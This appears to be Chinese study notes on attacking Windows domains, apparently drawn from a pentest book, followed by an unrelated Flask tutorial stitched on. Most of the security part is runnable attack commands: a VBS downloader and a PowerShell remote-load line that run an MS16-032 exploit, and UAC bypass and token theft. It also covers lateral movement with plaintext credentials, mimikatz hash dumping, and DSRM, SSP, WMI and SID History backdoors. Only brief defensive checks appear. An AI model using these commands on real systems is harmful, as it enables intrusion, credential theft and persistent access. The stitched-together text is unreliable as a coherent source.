Invoke-portscan.ps1Nishang 的 Invoke-PortScan 模块Banner 信息扫描到开放端口后，可以使用 nc 或者客户端连接端口获取 Banner 信息，用于在漏洞库中检索对应的 POC，EXP。常用漏洞库 安全焦点中的 BugTraq Exploit-DB 收集域内基础信息确定当前内网的域，以及所控制的主机在域内，就可以进行域内相关信息的收集，以下的方法都是通过 LDAP 协议到域控制器上进行查询，因此只有域用户和本地 System 用户具有权限。 命令 作用 net view /domain 查询域 net view /domain:HACKE 查询域内所有主机 net group /domain 查询用户组列表 net group &quot;domain computers&quot; /domain 查询域成员 net accounts /domain 获取域密码策略 nltest /domain_trusts 查询域信任信息 查找域控制器 命令 作用 nltest /DCLIST:hacke 查看域控制器机器名 nslookup -type=SRV _ldap._tcp 查看域控制器主机名 net time /domain 查看时间 net group &quot;Domain Controllers&quot; /domain 查看域控制器组 netdom query pdc 查看域控制器机器名 获取域内用户和管理员信息查询域用户列表 命令 作用 net user /domain 查询用户列表 wmic useraccount get /all 查询域内用户详细信息 dsquery user 查询存在的用户 net localgroup administrators 查询本地管理员组用户，Domain Admins 组的用户默认为域内机器的本笃管理员用户 查询域管理员用户组 命令 作用 net group &quot;domain admins&quot; /domain 查询域管理员用户 net group &quot;Enterprise Admins&quot; /domain 查询域管理员用户 定位域管理员概述一个域中，当计算机加入域后，会默认给域管理员组赋予本地管理员权限。 定位域管理员的方式，一是日志，二是会话。日志是指本地机器的管理员日志，可以通过脚本或 Wevtutil 工具导出查看。会话是指域内每台机器的登录会话，可以使用 netsess.exe 或 PowerView 等工具查询（可以匿名，不需要权限）。 常用域管理员定位工具假设已经取得了域内普通用户的权限，希望横向移动，需要知道域内用户登录的位置、他是否是任何系统的本地管理员、他所属的组、他是否有权访问文件共享等。枚举主机、用户和组有助于了解域内布局。 常用域管理员定位工具有 psloggedon.exe、PVEFinADUser.exe、netsess.exe、以及 hunter、NetView 等。在 PowerShell 中，常用的是 PowerView。 查找域管理进程本机检查12net group &quot;Domain Admins&quot; /Domain # 查看域管理员tasklist /v # 列出本机的所有进程和进程用户，在其中寻找域管理员进程 查询域控制器的域用户会话在域控制器中查找域用户会话列表，并将其于域管理员列表进行交叉引用，从而得到域管理会话的系统列表。 查询域控制器列表，可以使用 LDAP 查询从 Domain Controllers 单元中收集的域控制器列表或者使用 net group &quot;Domain Controllers&quot; /domain&quot; 收集域管理员列表，可以使用 LDAP 查询或者使用 net group &quot;Domain Admins&quot; /domain 收集所有活动域的会话列表，可以使用 netsess.exe，NetSess -h 交叉引用域管理员列表和活动绘画列表，可以确定哪些 IP 地址有活动域令牌。将域控制器列表保存到 dcs.txt，域管理员列表保存到 admins.txt，执行 1FOR /F %i in (dcs.txt) do @echo [+] Querying DC %i &amp;&amp; @netsess -h %i 2&gt;nul &gt;sessions.txt &amp;&amp; FOR /F %a in (admins.txt) DO @type sessions.txt |findstr /I %a 类似的也可以使用 Get Domain Admins 脚本。 查询远程系统中运行的任务如果目标机器在域系统中是通过共享的本地管理员账户运行的，就可以用以下方式查询系统中的域管理员任务，将目标域系统列表添加到 ips.txt，将收集到的域管理员列表添加到 names.txt 12net group &quot;Domain Admins&quot; /domainFor /F %i in (ips.txt) DO @echo [+] %i &amp;&amp; @tasklist /V /S %i /U user /P password 2&gt;nul &gt; output.txt &amp;&amp; FOR /F %n in (names.txt) DO @type output.txt | findstr %n &gt; nul &amp;&amp; echo [!] %n was found running a prosess on %i &amp;&amp; pause 扫描远程系统的 NetBIOS 信息某些版本的 Windows 允许用户通过 NetBIOS 查询已登录用户，将目标域系统添加到 ips.txt，将收集到的域管理员列表添加到 admins.txt 1for /F %i in (ips.txt) do @echo [+] Checking %i &amp;&amp; nbtstat -A %i 2&gt;nul &gt; nbsessions.txt &amp;&amp; FOR /F %n in (admins.txt) DO @type nbsessions.txt | findstr /I %n &gt;nul &amp;&amp; echo [!] %n was found logged into %i 也可以使用 nbtscan 工具， 1for /F %i in (ips.txt) do @echo [+] Checking %i &amp;&amp; nbtscan -f %i 2&gt;nul &gt;nbsessions.txt &amp;&amp; FOR /F %n in (admins.txt) DO @type nbsessions.txt | findstr /I %n &gt;nul &amp;&amp; echo [!] %n was found logged into %i 利用 PowerShell- 域分析工具 BloodHound- 敏感数据的防护- 分析域内网段划分情况和拓扑结构- 隐藏通信隧道技术基础知识概述常见隧道： 网络层：IPv6，ICMP，GRE 传输层：TCP，UDP，端口转发 应用层：SSH，HTTP，HTTPS，DNS 判断内网连通性 ICMP：ping &lt;ip&gt; TCP：nc &lt;ip&gt; &lt;port&gt; HTTP：curl &lt;ip&gt;:&lt;port&gt; DNS：nslookup &lt;domainname&gt; &lt;vps-ip&gt;，dig @&lt;vps-ip&gt; &lt;domainname&gt; 有时流量不能直接流出，需要在内网中设置代理服务器，常用于通过企业办公网段上网的场景。判断方式：查看网络连接是否有与其他主机的8080端口（大概率）存在连接；查看内网中是否有主机名类似于 “proxy” 的机器；查看 IE 浏览器的直接代理；根据 pac 文件的路径（本地或远程），下载并查看；执行以下命令确认 12curl www.baidu.com # 不通curl -X &lt;proxyip:port&gt; www.baidu.com # 通 网络层隧道IPv6 隧道IPv6 隧道技术指通过 IPv4 隧道传递 IPv6 数据报文的技术。 工具：socat, 6tunnel, nt6tunnel ICMP 隧道工具：icmpsh, pingtunnel 传输层隧道技术工具：lcx, nc, powercat 应用层隧道技术SSH DNS dnscat2 Socks 代理earthworm reGeorg sSocks SocksCap64 Proxifier ProxyChains 压缩数据rar.exe将E:\\webs\\目录下的所有内容打包为1.rar放入E:\\webs\\目录下 1rar.exe a -k -r -s -m3 E:\\webs\\1.rar E:\\webs\\ 将E:\\webs\\1.rar解压到当前根目录下 1rar.exe e E:\\webs\\1.rar 分卷压缩、解压 分卷压缩E盘API目录下的所有文件及文件夹，设置每个分卷为20M 1rar.exe a -m0 -r -v20m E:\\test.rar E:\\API 将E:\\test.part01.rar解压到E盘的x1目录下 1rar.exe x E:\\test.part01.rar E:\\x1 7zip上传和下载FTPVBSdownload.vbs代码： 12345678910Set Post=CreateObject(&quot;Msxml2.XMLHTTP&quot;)Set shell = CreateObject(&quot;Wscript.Shell&quot;)post.Open &quot;GET&quot;,&quot;http://IP/shell.exe&quot;,0post.Send()Set aGet = CreateObject(&quot;ADODB.Stream&quot;)aGet.Mode = 3aGet.Type = 1aGet.Open()aGet.Write(post.responseBody)aGet.SaveToFile &quot;C:\\test\\shell.exe&quot;,2 执行下面命令即可在目标主机上下载shell.exe文件 1Cscript download.vbs 利用 Debug利用 Nishang 上传利用 bitsadmin 下载权限提升分析及防御Windows 最高权限 Trusted Installer，可以修改系统文件，高于 System 提权分为横向提权和纵向提权 系统内核溢出漏洞提权分析及防范通过手动执行命令发现缺失补丁123456//查看当前权限whoami /groupssysteminfowmic qfe get Caption,Description,HotFixID,InstalledOn 这个链接里也描述了一些方法和工具：https://www.k0rz3n.com/2019/01/27/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B0%8F%E6%8A%80%E5%B7%A7%E4%B8%80%EF%BC%9A%E5%AF%BB%E6%89%BEEXP/ 可以通过对比KB来判断是否存在提权漏洞。 MS16-032可以使用Invoke-MS16-032.ps1工具:https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1 1Invoke-MS16-032 -Application cmd.exe -Commandline &quot;/c net user 1 1 /add&quot; 远程加载： 1powershell -nop -exec bypass -c &quot;IEX(New-Object Net.WebClient).DownloadString(https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1);Invoke-MS16-032 -Application cmd.exe -Commandline &quot;/c net user 1 1 /add&quot;&quot; MS16-032的补丁编号为KB3139914 利用MSF发现缺失补丁1use post/windows/gather/enum_patches Windows Exploit Suggester将systeminfo信息输出到txt文件中 1systeminfo &gt; info.txt windows-exploit-suggester下载地址：https://github.com/AonCyberLabs/Windows-Exploit-Suggester 123./windows-exploit-suggester.py --updatepip install xlrd --upgrade/windows-exploit-suggester.py -d BulletinSearch.xlsx -i info.txt MSF中也存在此模块 1use post/multi/recon/local_exploit_suggester Powershell中的Sherlock下载地址：https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1 12. .\\sherlock.ps1find-AllVulns Windows 操作系统配置错误急用分析和防范系统服务权限配置错误使用Powerup 12. .\\Powerup.ps1Invoke-AllChecks 可信任服务路径漏洞这个漏洞在书中说明了利用方式，但是并没有说明根本原理，这个漏洞是由于使用CreateProcess函数创建进程时对第二个参数中的文件路径没有使用双引号括起来，这个不再说明了，在之前整理ATT&amp;CK的文档的时候已经弄过了很多遍。可以参考这个文档：https://www.cnblogs.com/sevck/p/8488469.html 书中说到了一个查找漏洞存在的方法： 1wmic service get name,displayname,pathname,startmode |findstr /i &quot;Auto&quot; |findstr /i /c &quot;C:\\Windows\\\\&quot; |findstr /i /v &quot;&quot;&quot; MSF中存在能够利用的模块（需要有session）： 1use trusted_service_path 自动安装配置文件利用的是网络管理员在内网中给多台机器配置环境的配置文件中的敏感信息，如密码等。常用配置文件目录： 1234sysprep.infsysprep.xmlunattend.xmlunattended.xml MSF中的利用模块： 1use post/windows/gather/enum_unattend 计划任务查看当前计划任务： 1schtasks /query /fo LIST /v 这里提到了一个工具，AccessChk用于在Windows中运行一些系统或程序的高级查询，管理和故障排除工作。可以通过这个工具来查看指定目录的权限配置情况，如果当前权限有某个高权限的程序执行文件的写权限，那么就可以替换高权限文件进行权限提升。（这里说到的是使用计划任务来进行定时执行） 使用方法： 12345//不弹框运行accesschk.exe /accepteula//这里原书中的命令空格被吞了，说的是列出某个驱动器下所有权限配置有缺陷的文件夹,但是使用了之后发现应该不会遍历所有的文件夹.\\accesschk.exe -uwdqs Users c:\\.\\accesschk.exe -uwdqs &quot;Authenticated Users&quot; c:\\ Empire 的 Powerup 模块组策略首选项提权分析及防范这个说的就是查找组策略配置文件中加密过的密码，主要就是Group.xml等文件。 可以直接使用PowerSploit中的Get-GPPPassword.ps1来获取 12. .\\Get-GPPpassword.ps1Get-GppPassword 然后使用gpprefdecrypt.py脚本进行解密: 1python gpprefdecrypt.py XXXXXXXXXXXXXXXXXXXX 绕过 UAC 提权分析及防范MSF 中的 Bypassuac123use exploit/windows/local/bypassuacset session Xrun MSF 中的 RunAs123use exploit/windows/local/askset session Xrun 运行后目标主机会弹出一个 UAC 的框，点击是之后才会回弹一个新的 session，如果弹回的不是 system 权限的 session 可以使用 getsystem 命令提升 Nishang 中的 Invoke-PsUACme 模块123456/使用sysprep方法并执行默认的payloadInvoke-PsUACme -Verbose//使用oobe方法并执行默认的payloadInvoke-PsUACme -methed oobe -Verbose//使用oobe方法执行自定义的payloadInvoke-PsUACme -methed oobe -Payload &quot;powershell -windowstyle hidden -e &lt;your encoded payload&gt;&quot; 可以使用payloadpath参数指定payload的路径。 Empire 中的 bypassuac 模块1usemodule privesc/bypassuac 令牌窃取分析及防范123access token访问令牌：代表访问控制操作主体的系统对象security token认证令牌或硬件令牌：是一种用于实现计算机身份校验的物理设备，例如U盾session token会话令牌：是交互会话中唯一的身份标识符 伪造令牌攻击的核心是Kerberos协议。 令牌窃取MSF中的利用(已经有meterpreter)： 12use incognitolist_tokens -u 两种类型的令牌： 12Delegation Tokens 授权令牌：支持交互式登录（例如可以通过远程桌面登录及访问）Impersonation Tokens 模拟令牌：支持非交互式的会话 在MSF中可以选择使用某一个特定的TOKEN 1impersonate_token Rotten Potato本地提权分析利用的前提是系统中要存在有效的令牌，然后用这个工具快速模拟用户令牌，书中的环境存在SYSTEM的token，所以可以使用下面的命令进行窃取 下载地址：https://github.com/foxglovesec/RottenPotato.git 123upload /opt/RottenPotato/rottenpotato.exeexecute -HC -f rottenpotato.exeimpersonate_token &quot;NT AUTHORITY\\\\SYSTEM&quot; 添加域管理员这里说到了使用MSF的migrate命令，借助system权限的进程进行执行命令 Empire 下的令牌窃取分析使用Empire下的creds命令和mimikatz模块进行pth攻击 无凭证条件下的权限获取分析及防范使用Responder进行欺骗 域内横向移动分析及防御常用 Windows 远程连接和命令IPC 1net use \\\\192.168.1.10\\ipc$ &quot;admin123&quot; /user:administrator dir 1dir \\\\192.168.1.10\\c$ tasklist 1tasklist /S 192.168.1.10 /U administrator /P admin123 at：是Windows server 2008之前的计划任务命令 1at \\\\192.168.1.10 4:11PM C:\\shell.bat 创建之后会有一个任务ID，指定任务ID可以删除 1at \\\\192.168.1.10 7 /delete schtasks 1schtasks /create /s 192.168.1.10 /tn test /sc onstart /tr C:\\calc.bat /ru system /f ATT&amp;CK CredentialWMI基本的执行方式： 1wmic /node:192.168.1.10 /user:administrator /password:admin123 process call create &quot;cmd.exe&quot; /c ipconfig &gt; ip.txt&quot; 其他工具： impacket中的wmiexec，成功连接之后会有一个交互式的命令行 1wmiexec.py administrator:admin123@192.168.1.10 wmiexec.vbs 123cscript.exe //nologo wmiexec.vbs /shell 192.168.1.10 administrator admin123cscript.exe wmiexec.vbs /cmd 192.168.1.10 administrator admin123 &quot;ipconfig&quot; Invoke-WMICommand Invoke-WMICommand是PowerSpolit中的脚本： 12345$user = &quot;test\\administrator&quot;$password = ConverTo-SecureString -String &quot;admin123&quot; -AsPlainText -Force$Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $user, $password$remote = Invoke-WmiCommand -Payload {ipconfig} -Credential $Cred -ComputerName 192.168.1.10$remote.PayloadOutput Invoke-WMIMethod是powershell自带的 1234$user = &quot;test\\administrator&quot;$password = ConverTo-SecureString -String &quot;admin123&quot; -AsPlainText -Force$Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $user, $passwordInvoke-WMIMethod -Class Win32_Process -Name Create -ArgumentList &quot;ipconfig&quot; -ComputerName &quot;192.168.1.10&quot; -Credential $Cred SMBEXECImpacket中有这个插件 Linux版本下载地址：https://github.com/brav0hax/smbexec.git 安装命令： 12git clone https://github.com/brav0hax/smbexec.gitchmod +x install.sh &amp;&amp; ./install.sh DCOM 在远程系统中的使用通过本地 DCOM 执行命令获取DCOM程序列表： 12Get-CimInstance Win32_DCOMApplicationGet-WmiObject -Namespace ROOT\\CIMV2 -Class Win32_DCOMApplication 使用 DCOM 在远程机器上执行命令1调用MMC20.Application远程执行命令 123net use \\\\192.168.1.10 &quot;admin123&quot; /user:test\\xiaom$com = [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;192.168.1.10&quot;))$com.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,&quot;/c cmd.exe&quot;,&quot;&quot;) 2、调用9BA05972-F6A8-11CF-A442-00A0C90A8F39 1234$com = [Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39',&quot;192.168.1.10&quot;)$obj = [System.Activator]::CreateInstance($com)$item = $obj.item()$item.Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;/c calc.exe&quot;,&quot;c:\\windows\\system32&quot;,$null,0)关于这个方法的详细内容可以参考 https://bbs.pediy.com/thread-226540-1.htm SPN 在域环境中的应用Exchange 邮件服务器安全防范查看邮件数据库 1234//查询之前需要安装命令add-pssnapin microsoft.exchange *Get-MailboxDatabase -server &quot;Exchange1&quot;Get-MailboxDatabase -Identity 'Mailbox Database 1894576043' | Format-List Name,EdbFilePath,LogFolderPath 域控制器安全NTDS.dit导出 ntds.dit 中的散列值利用 dcsync 获取散列值使用 MSF 获取散列值Kerberos 与用户提权漏洞分析与防范跨域攻击分析与防御利用域信任关系的跨域攻击分析获取域信息这里说到了lg.exe这个工具，能够用来枚举远程主机用户和组的信息。 1234567891011//枚举域中的用户组lg.exe &lt;domain name&gt;\\.//枚举远程机器的本地组用户lg.exe \\\\dc2012//获取远程用户中全部用户的SIDlg.exe \\\\dc2012 -lu -sidsout//获取指定组中所有成员的SIDlg.exe \\\\dc2012\\administrators -sidsout 防范跨域攻击权限维持分析及防御操作系统后门分析与防范粘滞键后门注册表注入后门这个在ATT&amp;CK中的Persistence一章中的Registry Run Keys / Startup Folder中有提到。命令如下： 1REG ADD HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v RegRun /t REG_SZ /d &quot;c:\\windows\\system32\\calc.exe&quot; 计划任务后门meterpreter 后门Cymothoa 后门下载地址：https://sourceforge.net/projects/cymothoa/ 安装可参照https://blog.csdn.net/qq_17204441/article/details/88834099 1./cymothoa -s 0 -p &lt;process id&gt; -y &lt;port&gt; 安装成功后使用nc等工具连接设置的端口即可。 WMI 后门WMI后门的特征是无文件和无进程，将代码加密存储于WMI中，达到所谓的无文件，当设定的条件被满足时，系统将自动启动Powershell进程去执行后门程序，执行后进程将会消失。 Empire下有WMI相关的模块可以使用： 1usemodule powershell/persistence/elevated/wmi 可以在目标主机中使用命令查看存在的后门： 1Get-WMIObject -Namespace root\\Subscription -Class CommandLineEventConsumer 清理WMI后门的方法：删除自动运行列表中的恶意WMI条目，使用Get-WMIObject命令删除与WMI持久化相关的组件。 Web 后门Nishang 下的 WEBShellWeevely 后门webacoo 后门工具域控制器权限持久化分析与防范DSRM 后门使用mimikatz查看krbtgt账户密码hash值 1.\\mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::lsa /patch /name:krbtgt&quot; exit 查看SAM文件中本地管理员的NTLM HASH值 1.\\mimikatz.exe &quot;token::elevate&quot; &quot;lsadump::sam&quot; exit 将DSRM hash和kebtgt的密码同步： 1234ntdsutilset dsrm passwordSYNC FROM DOMAIN account krbtgtq 再次查看会发现DSRM密码和krbtgt的密码相同，然后修改DSRM的登陆方式，这个注册表键值为2表示”在任何情况下都可以使用DSRM管理员账号登陆域控制器”： 1New-ItemProperty &quot;hklm:\\system\\currentcontrolset\\control\\lsa\\&quot; -name &quot;dsrmadminlogonbehavior&quot; -value 2 -propertyType DWORD 使用mimikatz进行pth攻击： 1.\\mimikatz.exe &quot;privilege::Debug&quot; &quot;sekurlsa::pth /domain:DC /user:administrator /ntlm:XXXXXXXXXXX&quot; DSRM后门防御措施： 123检查hklm\\system\\currentcontrolset\\control\\lsa\\dsrmadminlogonbehavior注册表键值的值，确认值为1定期修改DSRM的账号经常检查ID为4794的日志 SSP 维持域控权限方式一： 1.\\mimikatz.exe &quot;privilege::debug&quot; &quot;misc::memssp&quot; exit 注销之后执行命令查看明文密码： 1powershell.exe cat c:\\windows\\system32\\mimilsa.log 方式二： 12powershell.exe cp .\\mimilib.dll C:\\Windows\\System32\\Set-ItemProperty &quot;hklm:\\system\\currentcontrolset\\control\\lsa\\&quot; -name &quot;Security Packages&quot; -value &quot;mimilib.dll&quot; 重启之后使用命令查看密码： 1powershell.exe cat c:\\windows\\system32\\kiwissp.log 防御措施： 123查看hklm\\system\\currentcontrolset\\control\\lsa\\Security Packages注册表项是否含有可疑的DLL文件检查C:\\windows\\system32\\目录下是否存在可疑的文件第三方工具检查 SID History 后门test为恶意账户，administrator 1234Import-module ActiveDirectoryGet-ADUser xiaom -Properties sidhistory.\\mimikatz.exe &quot;privilege::Debug&quot; &quot;sid::patch&quot; &quot;sid::add /sam:xiaom /new:administrator&quot; exit 此时使用xiaom账号可以访问域控 Golden Ticket and Silver TicketSkeleton KeyHook PasswordChangeNotify这个方法要使用Invoke-ReflectivePEInjection.ps1将HookPasswordChange.dll注入内存，在目标系统中启动管理员权限的powershell： 12. .\\Invoke-ReflectivePEInjection.ps1Invoke-ReflectivePEInjection -PEPath HookPasswordChange.dll -procname lsass 此时如果再修改用户密码则修改之后的密码会记录在C:\\windows\\Temp\\password.txt文件中。 工具下载地址：https://github.com/clymb3r/PowerShell/blob/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1 https://github.com/clymb3r/Misc-Windows-Hacking 参考地址：http://www.vuln.cn/6812 Nishang 下的脚本后门分析与防范HTTP-BackdoorAdd-scrnSaveBackdoorExecute-OnTimeInvoke-ADSBackdoorATT&amp;CK 框架InitialAccess（入口点）Execution（命令执行）Persistence（持久化）PrivilegeEscalation（权限提升）DefenseEvasion（绕过防御）Discovery（基础信息收集）lateral-movement（横向渗透）C&amp;C（命令控制）Exfiltration（信息窃取）基础KeyberosActive DirectoryAD 存储关于网络对象的相关信息，是管理员和用户可以轻松的查找和使用这些信息。 网络对象有：用户、用户组、计算机、域、组织单位以及安全策略等。 KeyberosKeyberos 是一种网络认证协议，认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意地读取、修改和插入数据。 参与角色 客户端 服务端 KDC（DC0 KDC 的组成 AD（Account Database）：存储所有客户端的白名单，只有在白名单中的客户端才可以申请 TGT AS（Authentication Service）：为客户端生成 TGT 的服务 TGS（Ticket Granting Service）：为客户端生成用于某个服务的 ticket 的 service 物理层面上，AD 和 KDC 都是域控。 原则 长期使用的密钥不应用于在网络上传输 只有 KDC 维护数据库（Account Database）来保存域中主机的 Master Key Keyberos 认证流程Keyberos 认证大致包含三个子过程： Client 向 KDC 申请 TGT（Ticket Granting Ticket） Client 通过获得的 TGT 向 KDC 申请用于访问 Server 的 Ticket Client 向 Server 提交 Ticket 用于认证 认证过程通过3个 Sub-protocol 完成，分别对应上面的3个子过程： Authentication Service Exchange Ticket Granting Service Exchange Client/Server Exchange Authentication Service Exchange通过这个 Sub-protocol，KDC（中的 AS）实现对 Client 身份的确认，并颁发给 Client 一个 TGT，具体过程如下： Client 向 KDC 的 Authentication Service 发送 Authentication Service Request（KRB_AS_REQ），为了确保 KRB_AS_REQ 仅限于自己和 KDC 知道，Client 使用自己的 Master Key 对 KRB_AS_REQ 的主体部分进行加密（KDC可以通过 Domain 的Account Database 获取该 Client 的 Master Key），KRB_AS_REQ 的主体部分包含以下内容： Pre-autentication data：包含用以证明自己身份的信息，一般是一个被 Client 的 Master Key 加密的 Timestamp Client name &amp; realm：简单来说就是 Domain_name\\Client Server Name：这里的 Server Name 不是 Client 想要访问的 Server 的名称，而是 KDC 的 Ticket Granting Service 的 Server Name AS 通过接收到的 KRB_AS_REQ 验证发送方是否为在 Client name &amp; realm 中声明的那个人，即使用从 Account Database 中提取的 Client 对应的 Master Key 对 Pre-authentication data 解密，如果得到了合法的 Timestamp，即可证明发送方提供的密码正确。 验证通过后，AS 将一份 Authentication Service Response（KRB_AS_REP）发送给 Client。KRB_AS_REP 主要包含两个部分：本 Client 的 Master Key 加密过的 Session Key（SKDC-Client; Logon Session Key）和被自己（KDC）加密过的 TGT，而 TGT 包含以下内容： Session Key; SKDC-Client; Logon Session Key Client name &amp; realm: Domain_name/Client End time: TGT 到期时间 Client 通过自己的 Master Key 对第一部分解密获得 Session Key 和加密的 TGT，使用 TGT 进入下一步 Ticket Granting Service ExchangeTGS Exchange 通过 Client 向 KDC 中的 TGS 发送 Ticket Granting Service Request（KRB_TGS_REQ）开始，KRB_TGS_REQ 大体包含以下内容： TGT：Client 通过 AS Exchange 获得 Ticket Granting Ticket，TGT 被 KDC 的 Master Key 加密 Authenticator：用以证明 TGT 的拥有者就是自己，所以必须以 TGT 的方法方（KDC）和自己的 Session Key（SKDC-Client）来进行加密 Client name &amp; realm：Domain_name/Client Server name &amp; realm：Domain_name/Server，这里的 Server 是 Client 试图访问的 Server TGS 收到 KRB_TGS_REQ 后，使用自己（KDC）的 Master Key对 Client 提供的 TGT 进行解密，获得这个 Logon Session Key，再通过这个 Logon Session Key 解密 Authenticator 进行验证，通过后向对方发送 Ticket Granting Service Response（KRB_TGS_REP），由两部分组成：使用 Logon Session Key 加密的用于 Client 和 Server 通信的 Session Key （SServer-Client）和使用 Server 的 Master Key 加密的 Ticket，该 Ticket 包含以下内容： Session Key：SServer-Client Client name &amp; realm：Domain_name/Client End time：Ticket 的到期时间 Client 收到 KRB_TGS_REP，使用 Logon Session Key 解密第一部分获得 Session Key（SServer-Client），Client 使用这个 Session Key 和 Ticket 与 Server 交互。 Client/Server ExchangeClient 通过 TGS Exchange 获得 Client 和 Server 的 Session Key，用 Session Key 加密 Authenticator，并将这个加密过的 Authenticator 和 Ticket 作为 Application Service Request（KRB_AP_REQ）发送给 Server，除了上述两项内容意外，KRB_AP_REQ 还包含一个 Flag 用于表示 Client 是否需要进行双向验证（Mutual Authentication）。 Server 接收到 KRB_AP_REQ 之后，通过自己的 Master Key 解密 Ticket，从而获得 Session Key，用 Session Key 解密 Authenticator，验证对方的身份。如果需要双向验证， Server 从 Authenticator 提取 Timestamp，使用 Session Key（SServer-Client）加密发送给 Client 验证 Server 的身份。 User2User Sub-Protocol由以上三个子过程进行的验证过程仍然是不完善的，因为使用了长期的密钥（Server Master Key）在网络上传输。解决方案是采用一个 Short-term 的 Session-Key 而不是 Server Master Key 对 Ticket 进行加密，这就是 User2User Protocol。用于加密 Ticket 的是 Server 和 KDC 之间的 Session Key。 原本在 AS Exchange 阶段，Client 获得的 TGT 中的 Ticket NTLMNTLM Hash通常意义上的 NTLM Hash 指存储在 SAM 数据库 以及 NTDS 数据库中对密码进行 Hash 摘要计算后的结果。这类 Hash 可以直接用于 PTH，并且通常存在于 lsass进程中便于 SSP（NTLM 安全支持提供程序）使用 生成过程： 用户密码：susi2001 首先，密码经过十六进制转为 7375736932303031 将十六进制结果转为 Unicode格式 73007500730069003200300030003100 以 Hex（16进制）数据作 MD4加密 ed3202726368f8e9fd23e78fbfac8c13 其中的 MD4 加密使用 HashCalc 本地认证 Windows 不存储用户的铭文密码，它会将用户的明文密码经过加密后存储在 SAM（Security Account Manager Database）中，SAM 的路径为%SystemRoot%\\system32\\config\\sam。 在进行本地认证时，用户登录，系统将用户输入的明文密码转换成 NTLM Hash，与 SAM 数据库中的 NTLM Hash 进行比较来实现认证。 首先，用户注销、重启、锁屏后，操作系统会让 winlogon 显示登陆界面，也就是输入框，接受输入后，将密码交给 lsass 进程，这个进程中会存有一份明文密码，将明文密码加密成 NTLM Hash，对比 SAM 数据库中的 Hash 进行验证。 NTLMNTLM 是一种网络认证协议，是以 NTLM Hash 作呕为根本凭证进行认证的协议。基于质询/应答（Challenge/Response）消息交换模式，常用于在工作组和域环境下登陆场景的身份认证 认证方式分为交互式认证和非交互式认证。 交互式认证：使用域账号登录到客户端，涉及客户端和域控两部分 非交互式认证：在已经登陆的客户端上使用 SSO 方式访问一台服务器，涉及客户端、域控和服务器。 认证流程NTLM 协议的认证过程有三步： 协商：主要用于确认双方协议版本（NTLMv1，NTLMv2 等） 质询：质询/应答（Challenge/Response）模式，用于信息交换 验证：验证身份的合法性，同窗由 Server 端或者 DC 完成这个过程 大致流程： 使用用户名和密码尝试登陆客户端 客户端对密码进行哈希处理并缓存密码 Hash，丢弃实际的明文密码（不存储），然后将用户名发送给服务器，发起认证请求 服务器生成一个 16 字节的随机数，成为质询（Challenge）或随机数（nonce aspx），并发送给客户端 客户端使用缓存的 Hash 对 Challenge 进行加密，加密结果为 Response，然后将结果发送给服务器 服务器发送三项数据给域控：User name；发送给客户端的 Challenge（已加密）；从客户端接收到的 Response 域控使用 User name 从 AD 中检索该用户密码的 NTLM Hash，并使用此 NTLM Hash来加密 Challenge，然后把这个值和客户端计算的响应值（Response）进行比较，相同则验证成功 Net-NTLM Hash经过 NTLM Hash 加密的 Challenge 结果在网络协议中成为 Net NTLM Hash，包含在 Response 中 NTLM v2相比于 NTLM v1，NTLM v2 把 Challenge 从 8 byte 改为 16 byte，计算 Net NTLM Hash 的算法由 DES 改为 HMAC-MD5","link":"/2020/07/29/intranet/"},{"title":"flask 开发","text":"使用 python3，linux Flask 简介准备创建应用目录git clone 现成的 git 仓库 123git clone https://github.com/miguelgrinberg/flasky.gitcd flaskygit checkout 1a 或者新建目录 12mkdir flaskycd flasky 准备虚拟环境使用venv的虚拟环境可以运行独立的解释器，安装独立的包。 123apt install python3-venv# 在flasky目录下python3 -m venv venv 激活虚拟环境 1source venv/bin/active 完成虚拟环境中的工作后使用 deactivate 取消激活 安装 flask在虚拟环境中安装flask 1(venv) $ pip install flask 应用的基本结构初始化12from flask import Flaskapp = Flask(__name__) 初始化 flask 应用需要创建一个 Flask类的对象，这个对象的初始化需要一个参数，即模块的__name。 web服务器通过WSGI(web server gateway interface) 协议把接收到的请求交给flask应用实例处理。 路由和视图函数客户端（例如浏览器）把请求发送给web服务器，服务器再把请求发给Flask应用实例，应用实例需要知道每个URL对应哪些代码，所以需要URL与python函数的映射关系，称为路由。。 定义路由的最简单方式是使用app.route装饰器 123@app.route('/')def index(): return '&lt;h1&gt;Hello,world!&lt;/h1&gt;' 也可以使用app.add_url_rule()方法 123def index(): return '&lt;h1&gt;Hello,world!&lt;/h1&gt;'app.add_url_rule('/','index',index) index()称为视图函数，客户端访问/时会触发index函数，返回值称为响应，是客户端看到的内容。 Flask 的 URL中可以使用动态内容 123@app.route('/user/&lt;name&gt;')def user(name): return 'Hello,{}!'.format(name) URL中的动态部分（由app.route中的尖括号指定）会作为参数传入视图函数，默认是字符串类型，可以使用其他类型，形如@app.route('/user/&lt;int:id&gt;')，可食用的过滤器有 string,，int，float 和 path。 完整应用实例hello.py 123456from flask import Flaskapp = Flask(__name__)@app.route('/')def index(): return '&lt;h1&gt;Hello,world!&lt;/h1&gt;' Web开发服务器通过 flask run 命令可以启动 flask自带的开发服务器，启动前需要设置FLASK_APP环境变量 12export FLASK_APP=hello.pyflask run 也可以使用app.run()方法启动，在上面flask实例最后加上 12if __name__ == '__main__': app.run() 开发服务器默认运行在5000端口 调试模式启动调试模式后，开发服务器会加载重载器和调试器。重载器监测文件目录，发现改动时自动重启服务器；调试器在Web浏览器提供交互式追踪，也可以审查源码。 与上例对应，启动方式分两种 123export FLASK_APP=hello.pyexport FLASK_DEBUG=1flask run 或者 1app.run(debug=True) 命令行选项1flask --help 